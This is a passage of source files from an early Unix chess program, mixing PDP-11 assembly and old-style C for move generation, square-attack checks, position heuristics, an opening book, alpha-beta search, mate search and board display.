	cmp	_board+[-17.*2](r0),r2
	beq	2f
1:
	jsr	r5,badiag; uleft; -9.*2
	jsr	r5,badiag; uright; -7.*2
	jsr	r5,badiag; dleft; 7.*2
	jsr	r5,badiag; dright; 9.*2
	jsr	r5,barank; up; -8.*2
	jsr	r5,barank; left; -1.*2
	jsr	r5,barank; right; 1.*2
	jsr	r5,barank; down; 8.*2

	bit	$uleft,_dir(r0)
	bne	1f
	cmp	_board-18.(r0),$1		/ pawn?
	beq	2f
1:
	bit	$uright,_dir(r0)
	bne	1f
	cmp	_board-14.(r0),$1
	bne	1f
2:
	clr	r0
	rts	pc
1:
	mov	$1,r0
	rts	pc

badiag:
	mov	r0,r1
	mov	(r5)+,r2
	mov	(r5)+,r3
	bit	r2,_dir(r1)
	bne	1f
	add	r3,r1
	mov	_board(r1),r4
	beq	2f
	cmp	r4,$3
	beq	9f
	cmp	r4,$5
	beq	9f
	cmp	r4,$6
	beq	9f
1:
	rts	r5
2:
	bit	r2,_dir(r1)
	bne	2f
	add	r3,r1
	mov	_board(r1),r4
	beq	2b
	cmp	r4,$3
	beq	9f
	cmp	r4,$5
	beq	9f
2:
	rts	r5

barank:
	mov	r0,r1
	mov	(r5)+,r2
	mov	(r5)+,r3
	bit	r2,_dir(r1)
	bne	1f
	add	r3,r1
	mov	_board(r1),r4
	beq	2f
	cmp	r4,$4
	beq	9f
	cmp	r4,$5
	beq	9f
	cmp	r4,$6
	beq	9f
1:
	rts	r5
2:
	bit	r2,_dir(r1)
	bne	2f
	add	r3,r1
	mov	_board(r1),r4
	beq	2b
	cmp	r4,$4
	beq	9f
	cmp	r4,$5
	beq	9f
2:
	rts	r5

9:
	mov	(sp)+,r5
	clr	r0
	rts	pc

_wattack:
	mov	2(sp),r0
	asl	r0
	mov	_dir(r0),r1
	mov	$-2,r2
	bit	$u2r1,r1
	bne	1f
	cmp	_board+[-15.*2](r0),r2
	beq	2f
1:
	bit	$u1r2,r1
	bne	1f
	cmp	_board+[-6.*2](r0),r2
	beq	2f
1:
	bit	$d1r2,r1
	bne	1f
	cmp	_board+[+10.*2](r0),r2
	beq	2f
1:
	bit	$d2r1,r1
	bne	1f
	cmp	_board+[+17.*2](r0),r2
	beq	2f
1:
	bit	$d2l1,r1
	bne	1f
	cmp	_board+[+15.*2](r0),r2
	beq	2f
1:
	bit	$d1l2,r1
	bne	1f
	cmp	_board+[+6.*2](r0),r2
	beq	2f
1:
	bit	$u1l2,r1
	bne	1f
	cmp	_board+[-10.*2](r0),r2
	beq	2f
1:
	bit	$u2l1,r1
	bne	1f
	cmp	_board+[-17.*2](r0),r2
	beq	2f
1:
	jsr	r5,wadiag; uleft; -9.*2
	jsr	r5,wadiag; uright; -7.*2
	jsr	r5,wadiag; dleft; 7.*2
	jsr	r5,wadiag; dright; 9.*2
	jsr	r5,warank; up; -8.*2
	jsr	r5,warank; left; -1.*2
	jsr	r5,warank; right; 1.*2
	jsr	r5,warank; down; 8.*2

	bit	$dleft,_dir(r0)
	bne	1f
	cmp	_board+14.(r0),$-1		/ pawn?
	beq	2f
1:
	bit	$dright,_dir(r0)
	bne	1f
	cmp	_board+18.(r0),$-1
	bne	1f
2:
	clr	r0
	rts	pc
1:
	mov	$1,r0
	rts	pc

wadiag:
	mov	r0,r1
	mov	(r5)+,r2
	mov	(r5)+,r3
	bit	r2,_dir(r1)
	bne	1f
	add	r3,r1
	mov	_board(r1),r4
	beq	2f
	cmp	r4,$-3
	beq	9f
	cmp	r4,$-5
	beq	9f
	cmp	r4,$-6
	beq	9f
1:
	rts	r5
2:
	bit	r2,_dir(r1)
	bne	2f
	add	r3,r1
	mov	_board(r1),r4
	beq	2b
	cmp	r4,$-3
	beq	9f
	cmp	r4,$-5
	beq	9f
2:
	rts	r5

warank:
	mov	r0,r1
	mov	(r5)+,r2
	mov	(r5)+,r3
	bit	r2,_dir(r1)
	bne	1f
	add	r3,r1
	mov	_board(r1),r4
	beq	2f
	cmp	r4,$-4
	beq	9f
	cmp	r4,$-5
	beq	9f
	cmp	r4,$-6
	beq	9f
1:
	rts	r5
2:
	bit	r2,_dir(r1)
	bne	2f
	add	r3,r1
	mov	_board(r1),r4
	beq	2b
	cmp	r4,$-4
	beq	9f
	cmp	r4,$-5
	beq	9f
2:
	rts	r5

9:
	mov	(sp)+,r5
	clr	r0
	rts	pc
-- /usr/ken/chess/bgen.s mode=0100644 uid=6 gid=1 atime=173637308 mtime=173637308 --
/ generate moves

.globl	_bgen

.globl	_pval, _board, _dir
.globl	_flag, _lmp, _bkpos
.globl	_eppos
.globl	_value

uleft	= 04040
uright	= 04004
dleft	= 00440
dright	= 00404
left	= 00040
right	= 00004
up	= 04000
down	= 00400
u2r1	= 06004
u1r2	= 04006
d1r2	= 00406
d2r1	= 00604
d2l1	= 00640
d1l2	= 00460
u1l2	= 04060
u2l1	= 06040
rank2	= 00200
rank7	= 02000

_bgen:
	mov	$_dir+126.,r4
	mov	$_board+126.,r3
	mov	_lmp,r2
	mov	$63.,r1
0:
	mov	(r3),r0
	ble	1f
	asl	r0
	jmp	*2f-2(r0)

2:
	pawn
	knight
	bishop
	rook
	queen
	king

pawn:
	bit	$dleft,(r4)
	bne	2f
	tst	2*7.(r3)
	bge	3f
	jsr	r5,btry; 0; 7.*2
3:
	mov	r1,r0
	add	$7,r0
	cmp	r0,_eppos
	bne	2f
	jsr	r5,btry; 0; -1*2
2:
	bit	$dright,(r4)
	bne	2f
	tst	9.*2(r3)
	bge	3f
	jsr	r5,btry; 0; 2*9.
3:
	mov	r1,r0
	add	$9,r0
	cmp	r0,_eppos
	bne	2f
	jsr	r5,btry; 0; 2*1
2:
	tst	2*8.(r3)
	bne	1f
	jsr	r5,btry; 0; 2*8.
	bit	$rank7,(r4)
	beq	1f
	tst	2*16.(r3)
	bne	1f
	jsr	r5,btry; 0; 16.*2
	br	1f

knight:
	jsr	r5,btry; u2r1; -15.*2
	jsr	r5,btry; u1r2; -6.*2
	jsr	r5,btry; d1r2; 10.*2
	jsr	r5,btry; d2r1; 17.*2
	jsr	r5,btry; d2l1; 15.*2
	jsr	r5,btry; d1l2; 6.*2
	jsr	r5,btry; u1l2; -10.*2
	jsr	r5,btry; u2l1; -17.*2
	br	1f


1:
	cmp	-(r4),-(r3)
	dec	r1
	bpl	0b
	mov	r2,_lmp
	rts	pc

bishop:
	jsr	r5,bslide; uleft; -9.*2
	jsr	r5,bslide; uright; -7.*2
	jsr	r5,bslide; dleft; 7.*2
	jsr	r5,bslide; dright; 9.*2
	br	1b

rook:
	jsr	r5,bslide; up; -8.*2
	jsr	r5,bslide; down; 8.*2
	jsr	r5,bslide; left; -1.*2.
	jsr	r5,bslide; right; 1.*2
	br	1b
queen:
	jsr	r5,bslide; uleft; -9.*2
	jsr	r5,bslide; uright; -7.*2
	jsr	r5,bslide; dleft; 7.*2
	jsr	r5,bslide; dright; 9.*2
	jsr	r5,bslide; up; -8.*2
	jsr	r5,bslide; left; -1.*2
	jsr	r5,bslide; right; 1.*2
	jsr	r5,bslide; down; 8.*2
	br	1b

king:
	jsr	r5,btry; uleft; -9.*2
	jsr	r5,btry; uright; -7.*2
	jsr	r5,btry; dleft; 7.*2
	jsr	r5,btry; dright; 9.*2
	jsr	r5,btry; up; -8.*2
	jsr	r5,btry; left; -1.*2
	jsr	r5,btry; right; 1.*2
	jsr	r5,btry; down; 8.*2
	br	1b

btry:
	bit	(r5)+,(r4)
	bne	1f
	mov	r3,r0
	add	(r5),r0
	mov	(r0),r0
	bgt	1f
	asl	r0
	mov	_pval+12.(r0),(r2)
	sub	_value,(r2)+
	mov	(r5)+,r0
	asr	r0
	add	r1,r0
	movb	r0,(r2)+
	movb	r1,(r2)+
	rts	r5
1:
	tst	(r5)+
	rts	r5

bslide:
	mov	r4,-(sp)
	mov	r3,-(sp)
1:
	bit	(r5)+,(r4)
	bne	1f
	add	(r5),r3
	add	(r5),r4
	mov	(r3),r0
	bgt	1f
	blt	2f
	clr	(r2)
	sub	_value,(r2)+
	mov	r3,r0
	sub	$_board,r0
	asr	r0
	movb	r0,(r2)+
	movb	r1,(r2)+
	tst	-(r5)
	br	1b
2:
	asl	r0
	mov	_pval+12.(r0),(r2)
	sub	_value,(r2)+
	mov	r3,r0
	sub	$_board,r0
	asr	r0
	movb	r0,(r2)+
	movb	r1,(r2)+
1:
	tst	(r5)+
	mov	(sp)+,r3
	mov	(sp)+,r4
	rts	r5
-- /usr/ken/chess/bheur.c mode=0100644 uid=6 gid=1 atime=173637309 mtime=173637309 --
#include "old.h"

/*
 *	mobility
 *	1 for each potential move
 */

bheur1()
{

	return(-wheur1());
}

/*
 *	opening 'goodies'
 *	10 for each minor piece out
 *	-10 for blocking kq pawns
 */

bheur2()
{
	int i, mt;

	i = 0;
	if(game > 2) return(i);
	mt = amp[-1];
	if(mt == 2 || mt == 3) i =+ 30;
	if(mt == 0) i =- 20;
	i =+ 9*((board[1] != 2)+
		(board[6] != 2));
	i =+ 8*((board[2] != 3)+
		(board[5] != 3));

	/*
	 * -10 for blocked central pawns
	 */
	if(board[11]==1 && board[11+8]!=0) i =- 10;
	if(board[12]==1 && board[12+8]!=0) i =- 10;
	return(i);
}

/*
 *	ability to castle
 *	22 for both flags
 *	20 for one flag
 */

bheur3()
{
	int i;

	i = 0;
	/*
	 * queenside ability
	 */
	if(flag&020 && board[8]==1 && board[9]==1 && board[10]==1)
		i =+ 20;
	/*
	 *  kingside ability
	 */
	if(flag&010 && board[13]==1 && board[14]==1 && board[15]==1)
		i =+ 20;
	/*
	 * if both
	 */
	if(i == 40)
		i = 22;
	/*
	 * if castled,
	 * keep pawns in
	 */
	if(bkpos==2)
		if(board[10]==1 && (board[8]==1 || board[8+8]==1) &&
			(board[9]==1 || board[9+8]==1))
				i =+ 40;
	if(bkpos==6)
		if(board[13]==1 && (board[14]==1 || board[14+8]==1) &&
			(board[15]== -1 || board[15+8]== -1))
				i =+ 40;
	return(i);
}

/*
 *	prance
 *	a percentage if the
 *	piece on the move
 *	can be driven back
 *	by a smaller piece
 */

bheur4()
{
	int *p1, *p2, ploc, i;

	if(amp[-1] != 1) return(0);
	ploc = amp[-3];
	if(board[ploc] == 1) return(0);
	if(xheur(ploc)) return(0);
	p1 = lmp;
	p2 = p1;
	wagen();
	i = 0;
	while(p2 != lmp) {
		p2++;
		wmove(*p2++);
		i = xheur(ploc);
		wremove();
		if(i)
			break;
	}
	lmp = p1;
	return(-i);
}

/*
 *	control
 *	center control
 *		opening
 *		beginning
 *	king control
 *		middle
 *		end
 */

bheur5()
{

	return(-wheur5());
}
-- /usr/ken/chess/bmove.s mode=0100644 uid=6 gid=1 atime=173637310 mtime=173637310 --
.globl	_bmove, _bremove
.globl	_board, _pval, _amp, _flag, _eppos, _value, _bkpos
.globl	_game

_bmove:
	mov	_amp,r4
	movb	2(sp),r3		/ to
	movb	3(sp),r2		/ from
	mov	_value,(r4)+
	mov	_flag,(r4)+
	mov	_eppos,(r4)+
	mov	r2,(r4)+
	mov	r3,(r4)+
	asl	r2			/ from as a word index
	asl	r3			/ to as word index
	mov	_board(r3),r0
	mov	r0,(r4)+
	beq	1f
	asl	r0
	sub	_pval+12.(r0),_value
	cmp	r0,$-2
	bne	1f
	cmp	r3,$24.*2
	bge	1f
	add	$25.,_value
	cmp	r3,$16.*2
	bge	1f
	add	$50.,_value
1:
	mov	_board(r2),r0
	mov	r0,_board(r3)
	clr	_board(r2)
	mov	$-1,_eppos
	asl	r0
	ble	error
	jmp	*0f-2(r0)		/ type of man
0:
	pmove
	nmove
	bmove
	rmove
	qmove
	kmove

error:
	3

pmove:
	sub	r3,r2
	bge	1f
	neg	r2
1:
	cmp	r2,$2*1			/ ep capture
	bne	1f
	clr	_board(r3)
	mov	$1,_board+[2*8.](r3)
	mov	$4,(r4)+
	mov	r4,_amp
	rts	pc
1:
	cmp	r2,$2*16.		/ double move
	bne	1f
	movb	3(sp),r2
	add	$8,r2
	mov	r2,_eppos
	br	move
1:
	cmp	r3,$40.*2
	blt	move
	add	$25.,_value
	cmp	r3,$48.*2
	blt	move
	add	$50.,_value
	cmp	r3,$56.*2		/ queen promotion
	blt	move
	add	$625.,_value
	mov	$5,_board(r3)
	mov	$5,(r4)+
	mov	r4,_amp
	rts	pc

rmove:
	cmp	r2,$2*7.
	bne	1f
	bic	$10,_flag
	br	move
1:
	tst	r2
	bne	move
	bic	$20,_flag
	br	move

kmove:
	asr	r3
	mov	r3,_bkpos
	bic	$30,_flag
	cmp	r2,$2*4.
	bne	2f
	cmp	r3,$6			/ kingside castle
	bne	1f
	inc	_value
	mov	$4,_board+[2*5.]
	clr	_board+[2*7.]
	mov	$2,(r4)+
	mov	r4,_amp
	rts	pc
1:
	cmp	r3,$2			/ queenside castle
	bne	2f
	inc	_value
	mov	$4,_board+[2*3.]
	clr	_board+[2*0.]
	mov	$3,(r4)+
	mov	r4,_amp
	rts	pc
2:					/ king move
	tst	_game
	bne	1f
	sub	$2,_value
1:
	clr	(r4)+
	mov	r4,_amp
	rts	pc

qmove:
	tst	_game
	bne	move
	dec	_value
	br	move

nmove:
bmove:
move:
	mov	$1,(r4)+
	mov	r4,_amp
	rts	pc

_bremove:
	mov	_amp,r4
	mov	-(r4),r0
	mov	-(r4),r1
	mov	-(r4),r3
	mov	-(r4),r2
	mov	-(r4),_eppos
	mov	-(r4),_flag
	mov	-(r4),_value
	mov	r4,_amp
	asl	r2
	asl	r3
	mov	_board(r3),_board(r2)
	mov	r1,_board(r3)
	asl	r0
	jmp	*0f(r0)
0:
	movek
	movex
	moveo
	moveoo
	movep
	moveq

movek:
	asr	r2
	mov	r2,_bkpos

movex:
	rts	pc

moveo:
	mov	$4,_board+[2*7.]
	clr	_board+[2*5]
	mov	$4,_bkpos
	rts	pc

moveoo:
	mov	$4,_board+[2*0]
	clr	_board+[2*3]
	mov	$4,_bkpos;
	rts	pc

movep:
	mov	$1,_board(r2)
	clr	_board+[2*8.](r3)
	rts	pc

moveq:
	mov	$1,_board(r2)
	rts	pc
-- /usr/ken/chess/book.c mode=0100644 uid=6 gid=1 atime=173637311 mtime=173637311 --
#include "old.h"

bookm()
{
	int i, buf[2];

	if(!bookp) return(0);
	seek(bookf, bookp, 0);

	i = 0;
loop:
	read(bookf, buf, 4);
	*buf = booki(*buf);
	if(*buf >= 0) {
		if(!i)
			i = *buf;
		goto loop;
	}
	if(abmove = i)
		return(1);
	return(0);
}

makmov(m)
{
	int buf[2];

	out1(m);
	mantom? bmove(m): wmove(m);
	increm();
	if(!bookp) return;
	seek(bookf, bookp, 0);

loop:
	read(bookf, buf, 4);
	*buf = booki(*buf);
	if(m == *buf || *buf == 0) {
		bookp = buf[1] & ~1;
		goto l1;
	}
	if(*buf < 0) {
		bookp = 0;
		goto l1;
	}
	goto loop;

l1:
	if(!bookp) {
		putchar('\n');
		return;
	}
}

booki(m)
{
	int i;
	struct {
		char low;
		char high;
	};
	i.high = m.low;
	i.low = m.high;
	return(i);
}

-- /usr/ken/chess/bplay.c mode=0100644 uid=6 gid=1 atime=173637312 mtime=173637312 --
#include "old.h"

bplay()
{
	int v1, v2, *p1, *p2, *p3, ab;

	if(value > ivalue)
		ivalue = value;
	ab = 0;
	v1 = -3000;
	ply = 0;
	p1 = statl();
	if(lmp == p1+2) {
		abmove = p1[1];
		lmp = p1;
		return(ivalue);
	}
	p2 = p1;
	mantom = !mantom;
	while(p2 != lmp) {
		p2++;
		bmove(*p2);
		if(rept())
			v2 = 0; else
			v2 = wplay1(v1);
		if(v2 > v1 && !mate(3, 0)) {
			ab = *p2;
			v1 = v2;
		}
		bremove();
		p2++;
	}
	if(ab == 0 && lmp != p1)
		ab = p1[1];
	mantom = !mantom;
	lmp = p1;
	abmove = ab;
	return(v1);
}

bplay1(ab)
int ab;
{
	int v1, v2, *p1, *p2;

	if(ply >= depth)
		return(bquies(ab));
	ply++;
	p1 = p2 = lmp;
	bgen();
	qsort(p1, lmp);
	v1 = -3000;
	while(p2 != lmp) {
		if(intrp)
			goto out;
		p2++;
		bmove(*p2);
		if(wattack(bkpos)) {
			v2 = wplay1(v1);
			if(v2 > v1)
				v1 = v2;
		}
		bremove();
		if(v1 >= ab)
			goto out;
		p2++;
	}
out:
	ply--;
	lmp = p1;
	if(v1 == -3000) {
		v1++;
		if(!check())
			v1 = 0;
	}
	return(v1);
}

bquies(ab)
int ab;
{
	int *p1, *p2, *p3, v1, v2;

	if(ply >= qdepth)
		return(ivalue);
	p1 = p2 = p3 = lmp;
	bgen();
	while(p2 != lmp) {
		v1 = -(*p2++);
		if(v1 != value && v1 >= ivalue-50) {
			*p3++ = ((-(pval+6)[board[*p2>>8]]/100)<<8) |
				((pval+6)[board[*p2&0377]]/100);
			*p3++ = *p2;
		}
		p2++;
	}
	if(p3 == p1) {
		lmp = p1;
		return(value);
	}
	ply++;
	qsort(p1, p3);
	lmp = p3;
	p2 = p1;
	v1 = value;
	while(p2 != lmp) {
		p2++;
		bmove(*p2);
		if(wattack(bkpos)) {
			v2 = wquies(v1);
		} else
			v2 = -3000;
		if(v2 > v1)
			v1 = v2;
		bremove();
		if(v1 >= ab)
			goto out;
		p2++;
	}
out:
	ply--;
	lmp = p1;
	return(v1);
}
-- /usr/ken/chess/ctrl.s mode=0100644 uid=6 gid=1 atime=173637313 mtime=173637313 --
/ list pieces controlling a square

.globl	_attack

.globl	_dir, _board
.globl	_attacv

none	= 12345
uleft	= 04040;
uright	= 04004;
dleft	= 00440;
dright	= 00404;
left	= 00040;
right	= 00004;
up	= 04000;
down	= 00400;
u2r1	= 06004;
u1r2	= 04006;
d1r2	= 00406;
d2r1	= 00604;
d2l1	= 00640;
d1l2	= 00460;
u1l2	= 04060;
u2l1	= 06040;

_attack:
	mov	2(sp),r0
	asl	r0
	mov	$_attacv,r4

	jsr	r5,patt
		u2r1
		-15.*2
		2; -2
	jsr	r5,patt
		u1r2
		-6.*2
		2; -2
	jsr	r5,patt
		d2r1
		17.*2
		2; -2
	jsr	r5,patt
		d2l1
		15.*2
		2; -2
	jsr	r5,patt
		d1l2
		6.*2
		2; -2
	jsr	r5,patt
		u1l2
		-10.*2
		2; -2
	jsr	r5,patt
		u2l1
		-17.*2
		2; -2

	jsr	r5,satt
		uleft; -9.*2
		1
		3; -3; 5; -5
	jsr	r5,satt
		uright; -7.*2
		1
		3; -3; 5; -5
	jsr	r5,satt
		dleft; 7.*2
		-1
		3; -3; 5; -5
	jsr	r5,satt
		dright; 9.*2
		-1
		3; -3; 5; -5
	jsr	r5,satt
		up; -8.*2
		none
		4; -4; 5; -5
	jsr	r5,satt
		left; -1.*2
		none
		4; -4; 5; -5
	jsr	r5,satt
		right; 1.*2
		none
		4; -4; 5; -5
	jsr	r5,satt
		down; 8.*2
		none
		4; -4; 5; -5
	clr	(r4)+
	rts	pc

patt:
	bit	(r5)+,_dir(r0)
	bne	1f
	mov	r0,r1
	add	(r5)+,r1
	jsr	pc,look
	jsr	pc,look
	rts	r5
1:
	add	$6,r5
	rts	r5

satt:
	mov	r5,-(sp)
	bit	(r5)+,_dir(r0)
	bne	1f
	mov	r0,r1
	add	(r5)+,r1
	jsr	pc,look			/ pawn
	mov	r0,r1
2:
	mov	(sp),r5
	bit	(r5)+,_dir(r1)
	bne	1f
	add	(r5)+,r1
	tst	_board(r1)
	beq	2b
	tst	(r5)+
	mov	r4,-(sp)
	jsr	pc,look
	jsr	pc,look
	jsr	pc,look
	jsr	pc,look
	cmp	(sp)+,r4
	bne	2b
1:
	mov	(sp)+,r5
	add	$14.,r5
	rts	r5

look:
	cmp	(r5)+,_board(r1)
	bne	1f
	mov	-2(r5),(r4)+
1:
	rts	pc
-- /usr/ken/chess/data.c mode=0100644 uid=6 gid=1 atime=173637314 mtime=173637314 --
int	center[]
{
	2,3,4,4,4,4,3,2,
	3,6,8,8,8,8,6,3,
	4,8,12,12,12,12,8,4,
	4,8,12,14,14,12,8,4,
	4,8,12,14,14,12,8,4,
	4,8,12,12,12,12,8,4,
	3,6,8,8,8,8,6,3,
	2,3,4,4,4,4,3,2
};

int	wheur[]
{
	wheur1,
	wheur2,
	wheur3,
	wheur4,
	wheur5,
	0
};

bheur[]
{
	bheur1,
	bheur2,
	bheur3,
	bheur4,
	bheur5,
	0
};

pval[]
{
	-3000, -900, -500, -300, -300, -100,
	0,
	100, 300, 300, 500, 900, 3000
};

int	moveno	1;
int	depth	2;
int	qdepth	8;
int	mdepth	4;
int	flag	033;
int	eppos	64;
int	bkpos	4;
int	wkpos	60;
edge[]
{
	040, 020, 010, 0, 0, 1, 2, 4
};
-- /usr/ken/chess/init.c mode=0100644 uid=6 gid=1 atime=173637315 mtime=173637315 --
#include "old.h"

main()
{
	int i;

	printf("Chess\n");
	itinit();
	lmp = lmbuf;
	amp = ambuf;
	*amp++ = -1;
	*lmp++ = -1;		/* fence */
	bookf = open("/usr/lib/book", 0);
	if(bookf > 0)
		read(bookf, &bookp, 2);
	i = 0;
	board[i++] = 4;
	board[i++] = 2;
	board[i++] = 3;
	board[i++] = 5;
	board[i++] = 6;
	board[i++] = 3;
	board[i++] = 2;
	board[i] = 4;
	i = 8;
	while(i--) {
		board[i+8] = 1;
		board[48+i] = -1;
		board[56+i] = -board[i];
	}

	i = 64;
	while(i--)
		dir[i] = (edge[i/8]<<6) | edge[i%8];
	play(0);
}

ctime(s, t)
{

	printf("%s: %d:%d%d\n", s, t/60, (t/10)%6, t%10);
}

check()
{

	return((!wattack(bkpos) || !battack(wkpos))? 1: 0);
}

increm()
{

	clktim[mantom] =+ clock();
	if(mantom)
		moveno++;
	mantom = !mantom;
}

decrem()
{

	mantom = !mantom;
	if(mantom)
		moveno--;
}

stage()
{
	int i, a;

	if(value > 150)
		gval = 1; else
	if(value < -150)
		gval = -1; else
		gval = 0;
	i = -6;
	while(i <= 6) {
		a = (pval+6)[i];
		if(a < 0)
			a =- 50; else
			a =+ 50;
		if(a < 0)
			a = -((-a)/100); else
			a =/ 100;
		if(i)
			(pval+6)[i] = a*100-gval;
		i++;
	}
	a = 13800;
	i = 64;
	while(i--)
		a =- abs((pval+6)[board[i]]);
	if(a > 4000)
		game = 3; else
	if(a > 2000)
		game = 2; else
	if(moveno > 5)
		game = 1; else
		game = 0;
}

posit(f, p, a)
int (*f)();
int *p;
{
	int m;

	while(amp != p) {
		m = amp[3]<<8;
		m =| amp[4]&0377;
		(*f)(m, a);
		if(mantom) {
			bmove(m);
			moveno++;
			mantom = 0;
		} else {
			wmove(m);
			mantom = 1;
		}
	}
}

rept1(m, a)
int *a;
{
	int i;

	if(mantom != a[64])
		return;
	for(i=0; i<64; i++)
		if(board[i] != a[i])
			return;
	a[65]++;
}

rept()
{
	int a[66], i, *p;

	for(i=0; i<64; i++)
		a[i] = board[i];
	a[64] = mantom;
	a[65] = 0;
	p = amp;
	while(amp[-1] != -1) {
		if(amp[-2])
			break;
		i = board[amp[-3]];
		if(i == 1 || i == -1)
			break;
		mantom? wremove(): bremove();
		decrem();
	}
	posit(rept1, p, a);
	return(a[65]);
}
-- /usr/ken/chess/io.c mode=0100644 uid=6 gid=1 atime=173637316 mtime=173637316 --
#include "old.h"

rline()
{
	char *p1;
	int c;

	p1 = sbuf;
	while((c = getchar()) != '\n')
		if(c <= 0)
			onhup(); else
			*p1++ = c;
	*p1++ = '\0';
}

getchar()
{
	int c;

loop:
	c = 0;
	if(read(0, &c, 1) <= 0) {
		if(intrp) {
			intrp = 0;
			goto loop;
		}
		return(0);
	}
	return(c);
}

pboard()
{
	int i, x, y, c, p;

	c = 0;
	i = 0;
	x = 8;
	while(x--) {
		if(!mantom || mfmt)
			putchar('1'+x); else
			putchar('8'-x);
		putchar(' ');
		c++;
		y = 8;
		while(y--) {
			c++;
			putchar(' ');
			if(p = board[i++])
				putchar("kqrbnp PNBRQK"[p+6]); else
				if((c&1)!=0)
					putchar('*'); else
					putchar('-');
		}
		putchar('\n');
		if(intrp)
			return;
	}
	if(mfmt)
		printf("\n   a b c d e f g h"); else
		printf("\n   q q q q k k k k\n   r n b     b n r");
		printf("\n");
}

out1(m)
{
	printf("%d. ", moveno);
	if(mantom)
		printf("... ");
	out(m);
	putchar('\n');
}

out(m)
int m;
{
	int from, to, epf, pmf;

	from = m>>8;
	to = m&0377;
	if(mfmt) {
		algco(from);
		algco(to);
		return;
	}
	mantom? bmove(m): wmove(m);
	epf = pmf = 0;
	switch(amp[-1]) {

	case 0:
	case 1:
		stdp(board[to]);
	ed:
		putchar('/');
		stdb(from);
		if(amp[-2]) {
			putchar('x');
			stdp(amp[-2]);
			putchar('/');
		} else
			putchar('-');
		stdb(to);
		break;

	case 3:
		putchar('o');
		putchar('-');

	case 2:
		putchar('o');
		putchar('-');
		putchar('o');
		break;

	case 4:
		epf = 1;
		putchar('p');
		goto ed;

	case 5:
		pmf = 1;
		putchar('p');
		goto ed;
	}
	if(pmf) {
		putchar('(');
		putchar('q');
		putchar(')');
	}
	if(epf) {
		putchar('e');
		putchar('p');
	}
	if(check())
		putchar('+');
	mantom? bremove(): wremove();
}

stdp(p)
int p;
{

	if(p < 0)
		p = -p;
	p = "ppnbrqk"[p];
	putchar(p);
}

stdb(b)
int b;
{
	int r, f;

	r = b/8;
	if((f = b%8) < 4)
		putchar('q'); else {
		putchar('k');
		f = 7-f;
	}
	f = "rnb\0"[f];
	if(f)
		putchar(f);
	putchar(mantom? r+'1': '8'-r);
}

algco(p)
int p;
{
	putchar('a'+(p%8));
	putchar('8'-(p/8));
}

putchar(c)
{

	switch(c) {

	case '\t':
		do
			putchar(' ');
		while(column%8);
		return;

	case '\n':
		column = 0;
		break;

	default:
		column++;
	}
	write(1, &c, 1);
}

prtime(a, b)
{

	printf("time = %d/%d\n", a, b);
}

score1(m)
{
	if(intrp)
		return;
	if(!mantom) {
		if(moveno < 10)
			putchar(' '); else
			putchar(moveno/10 + '0');
		putchar(moveno%10 + '0');
		putchar('.');
		putchar(' ');
	} else
		while(column < 20)
			putchar(' ');
	out(m);
	if(mantom)
		putchar('\n');
}

score()
{
	int *p;

	putchar('\n');
	p = amp;
	while(amp[-1] != -1) {
		mantom? wremove(): bremove();
		decrem();
	}
	posit(score1, p);
	putchar('\n');
}
-- /usr/ken/chess/ld mode=0100644 uid=6 gid=1 atime=173637318 mtime=173637318 --
cc -s -n\
agen.o\
att.o\
bgen.o\
bheur.o\
bmove.o\
book.o\
bplay.o\
ctrl.o\
data.o\
init.o\
io.o\
mater.o\
play.o\
qsort.o\
savres.o\
stat.o\
stdin.o\
wgen.o\
wheur.o\
wmove.o\
wplay.o
cp a.out /usr/games/chess
cc -s -n\
agen.o\
att.o\
bgen.o\
bheur.o\
bmove.o\
book.o\
bplay.o\
ctrl.o\
data.o\
init.o\
mater.o\
pio.o\
play.o\
qsort.o\
savres.o\
stat.o\
stdin.o\
wgen.o\
wheur.o\
wmove.o\
wplay.o
cp a.out /usr/vs/bin/chess
-- /usr/ken/chess/mater.c mode=0100644 uid=6 gid=1 atime=173637320 mtime=173637320 --
#include "old.h"

mate(n, f)
{
	int a, b;

	mantom = !mantom;
	if(f == 0) {
		b = mater(n);
		mantom = !mantom;
		return(b);
	}
	b = 0;
	if(matflg) {
		a = 1;
		while(!mater(a)) {
			if(a >= n) {
				matflg = 0;
				return(0);
			}
			a++;
		}
		b = abmove;
		goto out;
	}
	a = n;
	while(mater(a)) {
		if(a == mdepth) {
			printf("forced mate\n");
			matflg++;
		}
		b = abmove;
		if(a == 0)
			break;
		a--;
	}
out:
	mantom = !mantom;
	if(b) {
		abmove = b;
		return(1);
	}
	return(0);
}

mater(ns)
{
	int *p1, *p2, *p3, f;

	if(intrp || --ns < 0)
		return(0);
	p1 = lmp;
	p2 = p1;
	p3 = p1;
	mantom? wgen(): bgen();
	while(p2 != lmp) {
		p2++;
		mantom? wmove(*p2): bmove(*p2);
		if((!mantom && !battack(wkpos) && wattack(bkpos)) ||
		  (mantom && !wattack(bkpos) && battack(wkpos))) {
			*p3 = *p2;
			p3++;
		}
		mantom? wremove(): bremove();
		p2++;
	}
	lmp = p3;
	p2 = p1;
	while(p2 != lmp) {
		mantom? wmove(*p2): bmove(*p2);
		f = xmater(ns);
		mantom? wremove(): bremove();
		if(f) {
			abmove = *p2;
			lmp = p1;
			return(1);
		}
		p2++;
	}
	lmp = p1;
	return(0);
}

xmater(ns)
{
	int *p1, *p2, f;

	p1 = lmp;
	p2 = p1;
	mantom? bagen(): wagen();
	if(p2+2 == lmp && rept() == 0)
		ns++;
	while(p2 != lmp) {
		p2++;
		mantom? bmove(*p2): wmove(*p2);
		f = mater(ns);
		mantom? bremove(): wremove();
		if(!f) {
			lmp = p1;
			return(0);
		}
		p2++;
	}
	lmp = p1;
	return(1);
}
-- /usr/ken/chess/old.h mode=0100644 uid=6 gid=1 atime=173637321 mtime=173637321 --
#define	uleft	04040
#define	uright	04004
#define	dleft	00440
#define	dright	00404
#define	left	00040
#define	right	00004
#define	up	04000
#define	down	00400
#define	u2r1	06004
#define	u1r2	04006
#define	d1r2	00406
#define	d2r1	00604
#define	d2l1	00640
#define	d1l2	00460
#define	u1l2	04060
#define	u2l1	06040
#define	rank2	00200
#define	rank7	02000

int	attacv[64];
int	center[64];
int	wheur[];
int	bheur[];
int	control[64];
int	clktim[2];
int	qdepth;
int	mdepth;
int	bookf;
int	bookp;
int	manflg;
int	matflg;
int	intrp;
int	moveno;
int	gval;
int	game;
int	abmove;
int	*lmp;
int	*amp;
char	*sbufp;
int	lastmov;
int	mantom;
int	ply;
int	value;
int	ivalue;
int	mfmt;
int	depth;
int	flag;
int	eppos;
int	bkpos;
int	wkpos;
int	column;
int	edge[8];
int	pval[13];
int	dir[64];
int	board[64];
int	lmbuf[1000];
int	ambuf[1200];
